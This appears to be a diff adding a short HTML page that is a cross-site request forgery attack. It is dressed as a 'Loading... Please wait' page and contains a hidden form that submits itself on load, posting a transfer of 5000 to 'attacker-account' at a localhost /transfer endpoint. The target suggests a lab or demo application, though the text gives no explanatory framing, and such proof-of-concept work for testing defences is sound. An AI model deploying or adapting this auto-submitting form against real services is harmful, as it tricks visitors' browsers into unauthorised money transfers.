@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Loading...</title>
+</head>
+<body>
+
+<h1>Please wait...</h1>
+
+<form id="csrfForm"
+      action="http://localhost:3000/transfer"
+      method="POST">
+
+  <input type="hidden" name="to" value="attacker-account">
+
+  <input type="hidden" name="amount" value="5000">
+
+</form>
+
+<script>
+  document.getElementById('csrfForm').submit();
+</script>
+
+</body>
+</html>
